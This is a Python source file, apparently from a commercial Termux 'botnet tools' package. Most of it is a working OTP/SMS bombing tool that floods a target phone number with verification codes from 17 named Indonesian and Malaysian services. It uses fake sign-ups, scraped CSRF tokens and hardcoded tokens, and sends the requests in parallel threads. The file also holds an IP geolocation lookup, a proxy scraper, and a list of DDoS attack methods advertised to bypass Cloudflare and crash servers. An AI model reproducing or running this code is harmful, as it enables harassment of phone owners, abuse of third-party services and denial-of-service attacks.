# SYNCHRONOUS LICENSE GUARD
# =========================================================
def license_guard(cfg):
    result = check_license(cfg["device_key"])
    status = result.get("status")

    if status == "approved":
        return True

    if status == "blocked":
        clear()
        print(f"{C.RED}{C.BOLD}🚫 DEVICE DIBLOKIR OWNER!{C.RESET}")
        print(f"🔑 Device Key: {cfg['device_key']}")
        return False

    if status == "not_found":
        clear()
        print(f"{C.RED}{C.BOLD}❌ LICENSE TIDAK DITEMUKAN!{C.RESET}")
        return False

    return True


# ═══════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════
#   OTP SPAMMER PLATFORMS - 17 Platform
# ═══════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════

def generate_all_variants(phone):
    clean = ''.join(c for c in phone if c.isdigit())
    if clean.startswith('62'):
        core = clean[2:]
    elif clean.startswith('0'):
        core = clean[1:]
    else:
        core = clean
    return {
        '08': '0' + core,
        'nocode': core,
        'plus': '+62' + core,
        '62': '62' + core
    }


def get_variant(phone_input, format_type):
    variants = generate_all_variants(phone_input)
    return variants.get(format_type, variants['08'])


def get_ua():
    ua_pool = [
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ]
    return random.choice(ua_pool)


def rnd_name():
    return 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))


def rnd_email():
    return f"{''.join(random.choices(string.ascii_lowercase, k=7))}{random.randint(100,999)}@gmail.com"


def post_with_retry(url, **kwargs):
    max_retries = 2
    timeout = kwargs.pop('timeout', 8)
    if 'headers' not in kwargs:
        kwargs['headers'] = {}
    kwargs['headers']['Connection'] = 'close'
    kwargs['headers']['Accept-Encoding'] = 'gzip, deflate'
    for attempt in range(max_retries):
        try:
            kwargs['timeout'] = timeout
            kwargs['verify'] = False
            with requests.Session() as session:
                session.keep_alive = False
                resp = session.post(url, **kwargs)
                resp.close()
                return resp
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout, socket.timeout):
            if attempt < max_retries - 1:
                time.sleep(0.5 * (attempt + 1))
                continue
            return None
        except Exception:
            return None
    return None


def get_with_retry(url, **kwargs):
    max_retries = 2
    timeout = kwargs.pop('timeout', 6)
    if 'headers' not in kwargs:
        kwargs['headers'] = {}
    kwargs['headers']['Connection'] = 'close'
    for attempt in range(max_retries):
        try:
            kwargs['timeout'] = timeout
            kwargs['verify'] = False
            with requests.Session() as session:
                session.keep_alive = False
                resp = session.get(url, **kwargs)
                resp.close()
                return resp
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout, socket.timeout):
            if attempt < max_retries - 1:
                time.sleep(0.5 * (attempt + 1))
                continue
            return None
        except Exception:
            return None
    return None


def is_success(resp):
    if resp is None:
        return False, "⏰ Timeout"

    code = resp.status_code

    if code in [200, 201, 202, 204]:
        try:
            data = resp.json()
            if isinstance(data, dict):
                if data.get("success") is False:
                    return False, f"❌ {data.get('message', 'Failed')}"
                if data.get("error"):
                    return False, f"❌ {data.get('error')}"
                if data.get("status") == "error":
                    return False, f"❌ {data.get('message', 'Error')}"
            return True, "✅ OK"
        except:
            return True, "✅ OK"
    elif code == 429:
        return False, "🚦 Rate Limit"
    elif code in [400, 422]:
        return False, "⚠️ Bad Request"
    elif code == 401:
        return False, "🔒 Unauthorized"
    elif code == 403:
        return False, "🚫 Forbidden"
    elif code == 404:
        return False, "❌ Not Found"
    else:
        return False, f"❌ HTTP {code}"


# ---------- 1. TOKOPEDIA ----------
def spam_tokopedia(phone_input):
    phone_08 = get_variant(phone_input, "08")
    ld_url = (
        f"https://accounts.tokopedia.com/register?type=phone&phone={phone_08}"
        f"&status=eyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%3D%3D"
    )
    ld_encoded = urllib.parse.quote(ld_url, safe="")
    url_token = (
        f"https://accounts.tokopedia.com/otp/c/page?otp_type=116"
        f"&msisdn={phone_08}"
        f"&ld={ld_encoded}"
    )
    headers_get = {
        "User-Agent": get_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    session = requests.Session()
    try:
        resp = session.get(url_token, headers=headers_get, timeout=10)
        if resp.status_code != 200:
            return None
        token = None
        match = re.search(r'name=["\']tk["\'][^>]*value=["\']([^"\']+)["\']', resp.text)
        if match:
            token = match.group(1)
        if not token:
            match = re.search(r'"tk"\s*:\s*"([^"]+)"', resp.text)
            if match:
                token = match.group(1)
        if not token:
            match = re.search(r'[?&]tk=([^&\s]+)', resp.text)
            if match:
                token = urllib.parse.unquote(match.group(1))
        if not token:
            match = re.search(r'[a-f0-9]{20,}', resp.text)
            if match:
                token = match.group(0)
        if not token:
            return None
        url_post = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        headers_post = {
            "User-Agent": get_ua(),
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Origin": "https://accounts.tokopedia.com",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": url_token,
            "Accept": "application/json, text/javascript, */*; q=0.01",
        }
        data = {
            "otp_type": "116",
            "msisdn": phone_08,
            "tk": token,
            "number_otp_digit": "6"
        }
        return session.post(url_post, headers=headers_post, data=data, timeout=10)
    except:
        return None


# ---------- 2. PEGIPEGI ----------
def spam_pegipegi(phone_input):
    url = "https://api.pegipegi.com/v1/auth/otp"
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://www.pegipegi.com"}
    payload = {"phoneNumber": get_variant(phone_input, "08"), "type": "sms", "channel": "register"}
    return post_with_retry(url, headers=headers, json=payload, timeout=8)


# ---------- 3. BRI ----------
def spam_bri(phone_input):
    url = "https://api.bri.co.id/otp/send"
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://www.bri.co.id"}
    payload = {"phoneNumber": get_variant(phone_input, "08"), "type": "sms"}
    return post_with_retry(url, headers=headers, json=payload, timeout=8)


# ---------- 4. BEAUTYHAUL ----------
def spam_beautyhaul(phone_input):
    base = "https://www.beautyhaul.com"
    nama_depan = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    rand_email = f"{nama_depan.lower()}{random.randint(100,999)}@gmail.com"
    password = "Testt#12334"
    phone_nocode = get_variant(phone_input, "nocode")
    reg_payload = {"nama_depan": nama_depan, "nama_belakang": random.choice(['A', 'B', 'C']) + ''.join(random.choices(string.ascii_lowercase, k=4)), "email": rand_email, "nomor_kode_value": "62", "nomor_ponsel": phone_nocode, "password": password, "konfirmasi_password": password, "terms": "true"}
    bh_session = requests.Session()
    bh_session.keep_alive = False
    bh_session.headers.update({"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://www.beautyhaul.com", "Referer": "https://www.beautyhaul.com/account/register", "Connection": "close"})
    try:
        bh_session.post(f"{base}/ajax/account/save_register", json=reg_payload, timeout=8)
    except:
        pass
    otp_payload = {"method": "SMS"}
    return post_with_retry(f"{base}/ajax/account/send_otp", headers=bh_session.headers, json=otp_payload, timeout=8)


# ---------- 5. BONUS BELANJA ----------
def spam_bonusbelanja(phone_input):
    url = "https://www.bonusbelanja.com/api/auth/registration/app"
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://www.bonusbelanja.com"}
    payload = {"phone": get_variant(phone_input, "62"), "name": rnd_name(), "agreeTnc": True, "agreeContact": True, "method": "sms"}
    return post_with_retry(url, headers=headers, json=payload, timeout=8)


# ---------- 6. TIKET.COM ----------
def spam_tiketcom(phone_input):
    url = "https://api.tiket.com/v1/auth/otp"
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://www.tiket.com"}
    payload = {"phone": get_variant(phone_input, "08"), "type": "sms", "channel": "register"}
    return post_with_retry(url, headers=headers, json=payload, timeout=8)


# ---------- 7. MINUMYUKKAKA ----------
def spam_minumyukkaka(phone_input):
    session = requests.Session()
    session.keep_alive = False
    first_name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
    password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    phone_08 = get_variant(phone_input, "08")
    register_url = "https://minumyukkaka.com/services/liquid/Register"
    headers_register = {"User-Agent": get_ua(), "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://minumyukkaka.com", "Referer": "https://minumyukkaka.com/register", "Connection": "close"}
    register_data = {"registerModel[first_name]": first_name, "registerModel[email]": email, "registerModel[phone]": phone_08, "registerModel[password]": password, "registerModel[verify_password]": password}
    try:
        session.post(register_url, headers=headers_register, data=register_data, timeout=8)
    except:
        pass
    otp_url = "https://minumyukkaka.com/services/identity/requestOTP"
    headers_otp = {"User-Agent": get_ua(), "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://minumyukkaka.com", "Referer": "https://minumyukkaka.com/register", "Connection": "close"}
    otp_data = {"destination": phone_08, "otpLength": "6", "method": "sms"}
    return post_with_retry(otp_url, headers=headers_otp, data=otp_data, timeout=8)


# ---------- 8. ROYAL CANIN ----------
def spam_royal_canin(phone_input):
    sess = requests.Session()
    sess.keep_alive = False
    sess.headers.update({"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://club.royalcanin.id", "Referer": "https://club.royalcanin.id/sign-up", "Connection": "close"})
    try:
        sess.get("https://club.royalcanin.id/sign-up", timeout=8)
    except:
        pass
    otp_url = "https://club.royalcanin.id/api/get_otp"
    payload = {"params": {"Email": "", "mobile_number": get_variant(phone_input, "plus"), "OTPType": "SMS"}}
    return post_with_retry(otp_url, headers=sess.headers, json=payload, timeout=8)


# ---------- 9. DUNIAGAMES ----------
def spam_duniagames(phone_input):
    url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://duniagames.co.id", "x-device": str(uuid.uuid4())}
    payload = {"phoneNumber": get_variant(phone_input, "plus"), "userName": get_variant(phone_input, "nocode"), "method": "sms"}
    return post_with_retry(url, headers=headers, json=payload, timeout=8)


# ---------- 10. RUMAH123 ----------
def spam_rumah123(phone_input):
    url = "https://www.rumah123.com/api/otp/request-otp"
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://www.rumah123.com"}
    payload = {"cancelledRequestId": str(uuid.uuid4()), "ipAddress": "127.0.0.1", "phoneNumber": get_variant(phone_input, "nocode"), "portalId": 1, "type": "SMS"}
    return post_with_retry(url, headers=headers, json=payload, timeout=8)


# ---------- 11. INTERNET RAKYAT ----------
def spam_internetrakyat(phone_input):
    url = "https://internetrakyat.id/api/app/auth/send-otp-register"
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json", "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id"}
    payload = {"phone_number": get_variant(phone_input, "08"), "method": "sms"}
    return post_with_retry(url, headers=headers, json=payload, timeout=8)


# ---------- 12. AUTO2000 ----------
def spam_auto2000(phone_input):
    phone_08 = get_variant(phone_input, "08")
    url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
    session = requests.Session()
    try:
        session.get("https://auto2000.co.id", headers={"User-Agent": get_ua()}, timeout=5)
    except:
        pass
    headers = {
        "Host": "auto2000.co.id",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "User-Agent": get_ua(),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://auto2000.co.id",
        "Referer": "https://auto2000.co.id/login",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
    }
    cookies = {
        "system_token": "UeRmUjEnH5N9FEWf1lEAFDqcJ9w",
    }
    payload = {
        "phoneNumber": phone_08,
        "isCheckOtpLimit": True,
        "uniqueID": phone_08,
        "isLogin": False
    }
    try:
        return session.post(url, headers=headers, cookies=cookies, json=payload, timeout=10)
    except:
        return None


# ---------- 13. HRS-BRE ----------
def spam_hrsbre(phone_input):
    try:
        session = requests.Session()
        session.keep_alive = False
        base = "https://career.hrs-bre.site"
        resp = get_with_retry(f"{base}/auth/sign_up", headers={"User-Agent": get_ua()}, timeout=8)
        if not resp or resp.status_code != 200:
            return None
        boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        nik = ''.join(random.choices(string.digits, k=16))
        pw = "Aa1" + ''.join(random.choices(string.ascii_letters + string.digits, k=7))
        phone_08 = get_variant(phone_input, "08")
        body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"nik\"\r\n\r\n{nik}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{rnd_email()}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"whatsapp\"\r\n\r\n{phone_08}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{''.join(random.choices(string.ascii_letters, k=8))}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{pw}\r\n--{boundary}--\r\n")
        headers_post = {"User-Agent": get_ua(), "Content-Type": f"multipart/form-data; boundary={boundary}", "Origin": base, "Referer": f"{base}/auth/sign_up", "Connection": "close"}
        return post_with_retry(f"{base}/auth/sign_up_action", headers=headers_post, data=body, timeout=12)
    except:
        return None


# ---------- 14. ASTRA DAIHATSU ----------
def spam_astra_daihatsu(phone_input):
    phone_plus = get_variant(phone_input, "plus")
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_ua(),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/register",
        "X-Requested-With": "XMLHttpRequest",
    })
    try:
        resp = sess.get("https://www.astra-daihatsu.id/register", timeout=10)
        if resp.status_code != 200:
            return None
    except:
        return None

    csrf = None
    m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
    if m:
        csrf = m.group(1)
    if not csrf:
        m = re.search(r'<input\s+type="hidden"\s+name="_csrf"\s+value="([^"]+)"', resp.text)
        if m:
            csrf = m.group(1)
    if not csrf:
        m = re.search(r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}', resp.text)
        if m:
            csrf = m.group(0)
    if not csrf:
        csrf = "c5de9b78-1136-4a89-9cbd-e9aba82dfaef"

    otp_url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
    headers_otp = {
        "Content-Type": "application/json; charset=UTF-8",
        "csrftoken": csrf,
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/register",
        "User-Agent": get_ua(),
    }
    payload = {"phoneNo": phone_plus}
    try:
        return sess.post(otp_url, headers=headers_otp, json=payload, timeout=10)
    except:
        return None


# ---------- 15. YOODO ----------
def spam_yoodo(phone_input):
    phone_60 = '60' + get_variant(phone_input, "nocode")
    url = "https://api.yoodo.com.my/v1/auth/otp"
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://www.yoodo.com.my"}
    payload = {"phoneNumber": phone_60, "channel": "sms", "type": "login"}
    return post_with_retry(url, headers=headers, json=payload, timeout=8)


# ---------- 16. FASTWORK ----------
def spam_fastwork(phone_input):
    url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json", "Origin": "https://fastwork.id"}
    payload = {"phone_number": get_variant(phone_input, "08"), "method": "sms"}
    return post_with_retry(url, headers=headers, json=payload, timeout=8)


# ---------- 17. ALODOKTER ----------
def spam_alodokter(phone_input):
    url = "https://www.alodokter.com/login-with-phone-number"
    session = requests.Session()
    session.headers.update({
        "User-Agent": get_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    })
    try:
        resp = session.get("https://www.alodokter.com/login-alodokter", timeout=10)
        if resp.status_code != 200:
            return None
    except:
        return None

    csrf_token = None
    match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
    if match:
        csrf_token = match.group(1)
    if not csrf_token:
        match = re.search(r'<input\s+type="hidden"\s+name="_token"\s+value="([^"]+)"', resp.text)
        if match:
            csrf_token = match.group(1)
    if not csrf_token:
        match = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', resp.text)
        if match:
            csrf_token = match.group(1)
    if not csrf_token:
        csrf_token = "UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA=="

    headers = {
        "Host": "www.alodokter.com",
        "x-csrf-token": csrf_token,
        "sec-ch-ua-mobile": "?1",
        "User-Agent": get_ua(),
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.alodokter.com",
        "Referer": "https://www.alodokter.com/login-alodokter",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en;q=0.8",
        "Connection": "close",
    }

    phone_08 = get_variant(phone_input, "08")
    payload = {"user": {"phone": phone_08}}

    try:
        return session.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None


# ============================================================
# DAFTAR PLATFORM (17)
# ============================================================
PLATFORMS = [
    ("Tokopedia", spam_tokopedia),
    ("PegiPegi", spam_pegipegi),
    ("BRI", spam_bri),
    ("Beautyhaul", spam_beautyhaul),
    ("Bonus Belanja", spam_bonusbelanja),
    ("Tiket.com", spam_tiketcom),
    ("MinumYukKaka", spam_minumyukkaka),
    ("Royal Canin", spam_royal_canin),
    ("DuniaGames", spam_duniagames),
    ("Rumah123", spam_rumah123),
    ("Internet Rakyat", spam_internetrakyat),
    ("Auto2000", spam_auto2000),
    ("HRS-BRE", spam_hrsbre),
    ("Astra Daihatsu", spam_astra_daihatsu),
    ("Yoodo", spam_yoodo),
    ("Fastwork", spam_fastwork),
    ("Alodokter", spam_alodokter),
]


# =========================================================
# SPAM OTP (17 PLATFORM + LOADING)
# =========================================================
def spam_otp_menu():
    clear()
    print(f"{C.MAGENTA}╔══════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.MAGENTA}║  {C.BOLD}{C.WHITE}📱 SPAM OTP TOOLS{C.RESET}{C.MAGENTA}                                       ║{C.RESET}")
    print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════╝{C.RESET}\n")
    print(f"  {C.CYAN}⚡ {len(PLATFORMS)} Platform • 4 Varian Nomor{C.RESET}\n")

    phone = input(f"{C.CYAN}┌─ Nomor HP (08xxx) : {C.RESET}").strip()
    if not phone:
        return

    variants = generate_all_variants(phone)

    print(f"\n{C.YELLOW}[*] Varian nomor:{C.RESET}")
    for k, label in [("08", "08"), ("nocode", "8"), ("plus", "+62"), ("62", "62")]:
        print(f"    {C.GREEN}{label:>4}{C.RESET} → {C.WHITE}{variants[k]}{C.RESET}")

    print(f"\n{C.CYAN}[ SYSTEM ]{C.RESET} Menyiapkan spam ke {len(PLATFORMS)} platform...")
    time.sleep(0.4)
    hacker_loading(seconds=2.0, label="LOADING SPAMMER")

    logs = [
        ("Menginisialisasi session...", C.GREEN, "[✓]"),
        (f"Memuat {len(PLATFORMS)} platform...", C.GREEN, "[✓]"),
        ("Generate 4 varian nomor...", C.GREEN, "[✓]"),
        ("Menyiapkan request pool...", C.CYAN, "[→]"),
        ("Mengirim OTP...", C.YELLOW, "[⚡]"),
    ]
    for msg, col, pfx in logs:
        hacker_log(msg, col, pfx)

    print()
    print(f"{C.MAGENTA}┌────────────────────────────────────────────────────────────┐{C.RESET}")
    print(f"{C.MAGENTA}│ {C.BOLD}🚀 SPAM KE {len(PLATFORMS)} PLATFORM{C.RESET}                {C.DIM}{_dt.now().strftime('%H:%M:%S')}{C.MAGENTA}  │{C.RESET}")
    print(f"{C.MAGENTA}└────────────────────────────────────────────────────────────┘{C.RESET}\n")

    success_count = 0
    rate_limit_count = 0

    def run_platform(name, func):
        try:
            resp = func(phone)
            success, msg = is_success(resp)
            return name, success, msg
        except Exception as e:
            return name, False, f"Error: {str(e)[:20]}"

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(run_platform, name, func): name for name, func in PLATFORMS}
        for future in as_completed(futures):
            name, success, msg = future.result()
            if success:
                success_count += 1
                print(f"  {C.GREEN}✅{C.RESET} {name:<16}  {C.GREEN}→ {msg}{C.RESET}")
            else:
                if "Rate" in msg or "429" in msg:
                    rate_limit_count += 1
                    print(f"  {C.YELLOW}⚠️ {C.RESET} {name:<16}  {C.YELLOW}→ {msg}{C.RESET}")
                elif "Timeout" in msg:
                    print(f"  {C.YELLOW}⏰{C.RESET} {name:<16}  {C.YELLOW}→ {msg}{C.RESET}")
                else:
                    print(f"  {C.RED}❌{C.RESET} {name:<16}  {C.RED}→ {msg}{C.RESET}")

    print(f"\n{C.MAGENTA}┌────────────────────────────────────────────────────────────┐{C.RESET}")
    print(f"{C.MAGENTA}│ {C.BOLD}📊 HASIL:{C.RESET} {C.GREEN}{success_count}{C.RESET} OK  "
          f"{C.YELLOW}{rate_limit_count}{C.RESET} Rate Limit  "
          f"{C.DIM}• {_dt.now().strftime('%H:%M:%S')}{C.MAGENTA}  │{C.RESET}")
    print(f"{C.MAGENTA}└────────────────────────────────────────────────────────────┘{C.RESET}")

    input(f"\n{C.DIM}Enter untuk kembali...{C.RESET}")


# =========================================================
# IP HUNTER
# =========================================================
def ip_hunter_menu():
    clear()
    print(f"{C.MAGENTA}╔══════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.MAGENTA}║  {C.BOLD}{C.WHITE}🌐 IP HUNTER{C.RESET}{C.MAGENTA}                                            ║{C.RESET}")
    print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════╝{C.RESET}\n")

    target = input(f"{C.CYAN}┌─ IP / Domain : {C.RESET}").strip()
    if not target:
        return

    print(f"\n{C.YELLOW}[*] Mencari info...{C.RESET}\n")
    try:
        r = requests.get(f"http://ip-api.com/json/{target}", timeout=10)
        d = r.json()
        if d.get("status") == "success":
            print(f"  {C.BOLD}IP        :{C.RESET} {C.GREEN}{d.get('query')}{C.RESET}")
            print(f"  {C.BOLD}Negara    :{C.RESET} {C.WHITE}{d.get('country')}{C.RESET}")
            print(f"  {C.BOLD}Region    :{C.RESET} {C.WHITE}{d.get('regionName')}{C.RESET}")
            print(f"  {C.BOLD}Kota      :{C.RESET} {C.WHITE}{d.get('city')}{C.RESET}")
            print(f"  {C.BOLD}ISP       :{C.RESET} {C.WHITE}{d.get('isp')}{C.RESET}")
            print(f"  {C.BOLD}ASN       :{C.RESET} {C.WHITE}{d.get('as')}{C.RESET}")
            print(f"  {C.BOLD}Lokasi    :{C.RESET} {C.CYAN}{d.get('lat')}, {d.get('lon')}{C.RESET}")
            print(f"  {C.BOLD}Maps      :{C.RESET} {C.CYAN}https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}{C.RESET}")
        else:
            print(f"{C.RED}[!] Gagal: {d.get('message')}{C.RESET}")
    except Exception as e:
        print(f"{C.RED}[!] Error: {e}{C.RESET}")

    input(f"\n{C.DIM}Enter untuk kembali...{C.RESET}")


# =========================================================
# PROXY SCRAPER (SIMPLE)
# =========================================================
def proxy_scraper_menu():
    clear()
    print(f"{C.MAGENTA}╔══════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.MAGENTA}║  {C.BOLD}{C.WHITE}🕸️  PROXY SCRAPER{C.RESET}{C.MAGENTA}                                        ║{C.RESET}")
    print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════╝{C.RESET}\n")
    print(f"{C.YELLOW}[*] Scraping proxies...{C.RESET}\n")

    sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ]

    proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                for ln in r.text.splitlines():
                    ln = ln.strip()
                    if ln and ":" in ln and not ln.startswith("#"):
                        proxies.add(ln)
                print(f"  {C.GREEN}✓{C.RESET} {url.split('/')[-1]} → {len(proxies)} total")
        except Exception as e:
            print(f"  {C.RED}✗{C.RESET} {url.split('/')[-1]} → {str(e)[:30]}")

    with open("proxy.txt", "w") as f:
        f.write("\n".join(sorted(proxies)))

    print(f"\n{C.GREEN}✅ Total: {len(proxies)} proxy → proxy.txt{C.RESET}")
    input(f"\n{C.DIM}Enter untuk kembali...{C.RESET}")


# =========================================================
# DEVICE INFO MENU
# =========================================================
def device_info_menu(info, cfg):
    clear()
    print(f"{C.MAGENTA}╔══════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.MAGENTA}║  {C.BOLD}{C.WHITE}📱 DEVICE INFORMATION{C.RESET}{C.MAGENTA}                                  ║{C.RESET}")
    print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════╝{C.RESET}\n")
    print(f"  {C.BOLD}Device Key :{C.RESET} {C.GREEN}{cfg['device_key']}{C.RESET}")
    print(f"  {C.BOLD}Buyer      :{C.RESET} {C.WHITE}{cfg['buyer']}{C.RESET}")
    print(f"  {C.BOLD}Seller     :{C.RESET} {C.WHITE}{cfg['seller']}{C.RESET}")
    print(f"  {C.BOLD}IP Public  :{C.RESET} {C.CYAN}{info['ip']}{C.RESET}")
    print(f"  {C.BOLD}IP Local   :{C.RESET} {C.CYAN}{info['local_ip']}{C.RESET}")
    print(f"  {C.BOLD}Model      :{C.RESET} {C.WHITE}{info.get('model', 'Unknown')}{C.RESET}")
    print(f"  {C.BOLD}Hostname   :{C.RESET} {C.WHITE}{info['hostname']}{C.RESET}")
    print(f"  {C.BOLD}OS         :{C.RESET} {C.WHITE}{info['os']}{C.RESET}")
    print(f"  {C.BOLD}CPU        :{C.RESET} {C.WHITE}{info['cpu']}{C.RESET}")
    print(f"  {C.BOLD}Memory     :{C.RESET} {C.WHITE}{info['memory']}{C.RESET}")
    print()
    print(f"  {C.BOLD}Battery    :{C.RESET} {C.GREEN}{info['battery']['percent']}{C.RESET}")
    print(f"  {C.BOLD}Charging   :{C.RESET} {C.GREEN}{info['battery']['charging']}{C.RESET}")
    print(f"  {C.BOLD}Source     :{C.RESET} {C.WHITE}{info['battery']['source']}{C.RESET}")
    print(f"  {C.BOLD}Temp       :{C.RESET} {C.YELLOW}{info['battery']['temp']}{C.RESET}")
    print(f"  {C.BOLD}Volt       :{C.RESET} {C.WHITE}{info['battery']['volt']}{C.RESET}")
    print(f"  {C.BOLD}Health     :{C.RESET} {C.GREEN}{info['battery']['health']}{C.RESET}")
    print()
    input(f"{C.DIM}Enter untuk kembali...{C.RESET}")

def make_filled_banner(width=64, text="FWX TOOLS"):
    padding = max((width - len(text)) // 2 - 1, 0)
    top = RED_BG + " " * width + RESET
    middle = RED_BG + " " * padding + WHITE + BOLD + text + RESET + RED_BG + " " * (width - padding - len(text)) + RESET
    bottom = RED_BG + " " * width + RESET
    return "\n".join([top, middle, bottom])


def styled_header(width=64):
    top = LIGHT_BLUE + "=" * width + RESET
    inner = CYAN + " BOTNET TOOLS - TERMUX EDITION v3.0".center(width) + RESET
    sub = YELLOW + "t.me/FWXTools   |   Owner: FloX".center(width) + RESET
    bottom = LIGHT_BLUE + "=" * width + RESET
    return "\n".join([top, inner, sub, bottom])


BANNER = make_filled_banner() + "\n" + styled_header() + "\n"


# ========== DEFAULT METHODS ==========
DEFAULT_METHODS = {
    "L7": [
        {"name": "HTTP-SICARIO", "desc": "HTTP/2/1 Flooding/Protect Hard, Akamai"},
        {"name": "HTTP-FLOOD", "desc": "Good Attack Floods Req/s Per Sec"},
        {"name": "HTTP-BLOODS", "desc": "Good L7 Hold Website Per Uptime 84,292"},
        {"name": "HTTP-SUN", "desc": "L7 Bypassing, High/s, Per Sec, Pro"},
        {"name": "HTTP-MONTH", "desc": "L7 Priv Hold Website Hard All Penetrate"},
        {"name": "HTTP-PANEL", "desc": "L7 Private Hold Panel Pterodactyl"},
        {"name": "HTTP-BYPASS", "desc": "Bypass Cloudflare/Akamai WAF"},
        {"name": "HTTP-STORM", "desc": "Massive Request Storm High Concurrency"},
        {"name": "HTTP-KILLER", "desc": "Aggressive L7 Killer For Slow Servers"},
        {"name": "HTTP-CRASH", "desc": "Crash Server Via Request Overflow"},
